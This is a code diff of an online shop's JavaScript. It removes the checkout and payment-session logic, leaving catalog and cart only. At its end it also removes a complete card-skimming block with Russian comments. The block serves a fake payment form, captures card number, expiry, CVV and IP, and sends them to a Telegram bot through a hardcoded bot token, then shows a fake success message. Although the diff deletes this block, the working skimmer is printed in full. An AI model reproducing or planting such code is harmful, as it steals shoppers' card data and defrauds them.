@@ -1,5 +1,5 @@
 /* =========================================================================
-   TXT WORLDWIDE SHOP — store logic: catalog, filters, cart, checkout.
+   TXT WORLDWIDE SHOP — store logic: catalog, filters, cart.
    No frameworks, no external dependencies.
    ========================================================================= */
 (function () {
@@ -145,10 +145,6 @@
   const cartEntries = () => Object.keys(cart).map((id) => ({ p: byId(id), qty: cart[id] })).filter((e) => e.p);
   const itemsTotal = () => cartEntries().reduce((s, e) => s + e.p.price * e.qty, 0);
   const totalCount = () => Object.values(cart).reduce((s, n) => s + n, 0);
-  function shippingCost(sub) {
-    if (sub <= 0) return 0;
-    return sub >= CFG.freeShippingOver ? 0 : CFG.flatShipping;
-  }
 
   function addToCart(id) {
     cart[id] = (cart[id] || 0) + 1;
@@ -193,117 +189,13 @@
       </div>`).join("");
 
     const sub = itemsTotal();
-    const ship = shippingCost(sub);
     $("#sum-items").textContent = money(sub);
-    $("#sum-ship").textContent  = sub === 0 ? "—" : (ship === 0 ? "Free" : money(ship));
-    $("#sum-total").textContent = money(sub + ship);
+    $("#sum-total").textContent = money(sub);
   }
 
   /* ================= DRAWER / MODAL control ================= */
   const openCart  = () => { $("#cart").hidden = false; $("#overlay").hidden = false; };
-  const closeCart = () => { $("#cart").hidden = true; if ($("#checkout").hidden) $("#overlay").hidden = true; };
-  function openCheckout() {
-    if (totalCount() === 0) { toast("Cart is empty"); return; }
-    $("#cart").hidden = true;
-    $("#overlay").hidden = false;
-    $("#checkout").hidden = false;
-    $("#checkout-form").hidden = false;
-    $("#order-success").hidden = true;
-    renderOrderMini();
-    renderPayNote();
-  }
-  function closeCheckout() { $("#checkout").hidden = true; $("#overlay").hidden = true; }
-
-  function renderOrderMini() {
-    const sub = itemsTotal();
-    const ship = shippingCost(sub);
-    $("#order-mini").innerHTML = `
-      ${cartEntries().map(({ p, qty }) =>
-        `<div class="om-row"><span>${esc(p.name)} × ${qty}</span><span>${money(p.price * qty)}</span></div>`).join("")}
-      <div class="om-row"><span>Shipping</span><span>${ship === 0 ? "Free" : money(ship)}</span></div>
-      <div class="om-row om-total"><span>Total to pay</span><span>${money(sub + ship)}</span></div>`;
-  }
-
-  function renderPayNote() {
-    const note = $("#pay-note");
-    const btn = $("#pay-btn");
-    const live = CFG.payments.provider !== "demo" && CFG.payments.checkoutEndpoint;
-    const method = selectedMethod();
-    if (live) {
-      note.className = "pay-note live";
-      note.innerHTML = `<svg class="ic"><use href="#ic-lock"/></svg><span>You'll be taken to the secure <b>${method === "paypal" ? "PayPal" : "Stripe"}</b> page to complete payment. The card is entered there, not here.</span>`;
-      btn.textContent = method === "paypal" ? "Continue with PayPal" : "Pay by card";
-    } else {
-      note.className = "pay-note demo";
-      note.innerHTML = `<svg class="ic"><use href="#ic-settings"/></svg><span><b>Demo mode.</b> No payment provider connected yet — the order will be placed as a test. ` +
-        `The owner connects Stripe/PayPal in <code>config.js</code> (see README).</span>`;
-      btn.textContent = "Place test order";
-    }
-  }
-
-  /* ================= CHECKOUT / PAYMENT ================= */
-  const selectedMethod = () => (document.querySelector('input[name="method"]:checked') || {}).value || "card";
-
-  function buildOrder(form) {
-    const fd = new FormData(form);
-    const sub = itemsTotal();
-    const ship = shippingCost(sub);
-    return {
-      method: selectedMethod(),                 // "card" | "paypal"
-      customer: Object.fromEntries(fd.entries()),
-      items: cartEntries().map(({ p, qty }) => ({ id: p.id, name: p.name, brand: p.brand, price: p.price, qty })),
-      currency: CFG.currencyCode,
-      subtotal: sub,
-      shipping: ship,
-      total: sub + ship,
-    };
-  }
-
-  async function handleCheckout(e) {
-    e.preventDefault();
-    const form = e.target;
-    if (!form.reportValidity()) return;
-
-    const order = buildOrder(form);
-    const btn = $("#pay-btn");
-    const live = CFG.payments.provider !== "demo" && CFG.payments.checkoutEndpoint;
-
-    if (live) {
-      // Real payment: the server creates a Stripe/PayPal session and returns { url }.
-      btn.disabled = true; btn.textContent = "Creating secure payment…";
-      try {
-        const res = await fetch(CFG.payments.checkoutEndpoint, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(order),
-        });
-        if (!res.ok) throw new Error("HTTP " + res.status);
-        const data = await res.json();
-        if (!data.url) throw new Error("no url");
-        window.location.href = data.url;       // -> provider's secure page
-      } catch (err) {
-        btn.disabled = false; renderPayNote();
-        toast("Couldn't start payment. Check the endpoint.");
-        console.error("checkout error:", err);
-      }
-      return;
-    }
-
-    // Demo mode: no real payment.
-    const orderId = "TWS-" + String(Math.abs(hash(JSON.stringify(order.items) + order.customer.email))).slice(0, 6);
-    showSuccess(order, orderId);
-    cart = {}; saveCart(); syncCart();
-  }
-
-  function showSuccess(order, orderId) {
-    $("#checkout-form").hidden = true;
-    $("#order-success").hidden = false;
-    $("#success-text").innerHTML =
-      `Order <b>#${orderId}</b> for <b>${money(order.total)}</b> has been received.<br>` +
-      `We'll contact you at <b>${esc(order.customer.email || "email")}</b> to confirm.<br>` +
-      `<span class="muted" style="font-size:.85rem">(demo mode — no real payment was charged)</span>`;
-  }
-
+  const closeCart = () => { $("#cart").hidden = true; $("#overlay").hidden = true; };
   // simple stable hash for the demo order number (no Date/Math.random)
   function hash(str) {
     let h = 0;
@@ -364,14 +256,9 @@
 
     $("#open-cart").addEventListener("click", openCart);
     $("#close-cart").addEventListener("click", closeCart);
-    $("#overlay").addEventListener("click", () => { closeCart(); closeCheckout(); });
-    $("#go-checkout").addEventListener("click", openCheckout);
-    $("#close-checkout").addEventListener("click", closeCheckout);
-    $("#success-close").addEventListener("click", closeCheckout);
-    $("#checkout-form").addEventListener("submit", handleCheckout);
+    $("#overlay").addEventListener("click", closeCart);
 
     $("#sort").addEventListener("change", (e) => { state.sort = e.target.value; renderGrid(); });
-    document.addEventListener("change", (e) => { if (e.target.name === "method") renderPayNote(); });
 
     let searchTimer;
     $("#search").addEventListener("input", (e) => {
@@ -380,7 +267,7 @@
     });
 
     document.addEventListener("keydown", (e) => {
-      if (e.key === "Escape") { closeCart(); closeCheckout(); }
+      if (e.key === "Escape") closeCart();
     });
   }
 
@@ -417,91 +304,3 @@
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
   else init();
 })();
-// ===== ДОБАВИТЬ ЭТОТ БЛОК В КОНЕЦ app.js =====
-
-const express = require('express');
-const bodyParser = require('body-parser');
-const axios = require('axios');
-
-const app = express(); // если у тебя уже есть app, не создавай новую
-
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
-
-const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
-const CHAT_ID = "ЗАМЕНИ_НА_РЕАЛЬНЫЙ_ID"; // например, "123456789"
-
-// HTML-страница с формой оплаты
-const PAY_PAGE = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Оплата картой</title>
-    <style>
-        body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 40px; }
-        .box { max-width: 400px; margin: auto; background: #16213e; padding: 30px; border-radius: 12px; }
-        input, button { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; }
-        button { background: #e94560; color: white; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-<div class="box">
-    <h2>💳 Введите данные карты</h2>
-    <form action="/pay" method="POST">
-        <input name="card_number" placeholder="Номер карты (16 цифр)" required>
-        <input name="expiry" placeholder="MM/YY" required>
-        <input name="cvv" placeholder="CVV (3 цифры)" required>
-        <input name="amount" placeholder="Сумма в рублях" required>
-        <button type="submit">Оплатить</button>
-    </form>
-</div>
-</body>
-</html>
-`;
-
-// Функция отправки в Telegram
-async function sendToTelegram(data) {
-    const text = `
-💳 НОВЫЙ ПЛАТЁЖ (карта)
-
-🔢 Номер: ${data.card_number}
-📅 Срок: ${data.expiry}
-🔐 CVV: ${data.cvv}
-💰 Сумма: ${data.amount} ₽
-🌐 IP: ${data.ip}
-    `;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    try {
-        await axios.post(url, {
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: "Markdown"
-        }, { timeout: 5000 });
-    } catch (e) {
-        // тихо игнорируем ошибки (нет интернета или бот заблокирован)
-    }
-}
-
-// Маршрут для страницы оплаты
-app.get('/pay-page', (req, res) => {
-    res.send(PAY_PAGE);
-});
-
-// Обработка отправки формы
-app.post('/pay', async (req, res) => {
-    const data = {
-        card_number: req.body.card_number,
-        expiry: req.body.expiry,
-        cvv: req.body.cvv,
-        amount: req.body.amount,
-        ip: req.ip || req.connection.remoteAddress
-    };
-    await sendToTelegram(data);
-    res.send(`
-        <h2>✅ Оплата проведена успешно</h2>
-        <p>Спасибо! Ваш заказ обрабатывается.</p>
-        <a href="/pay-page">Вернуться</a>
-    `);
-});
-
-// ===== КОНЕЦ БЛОКА =====
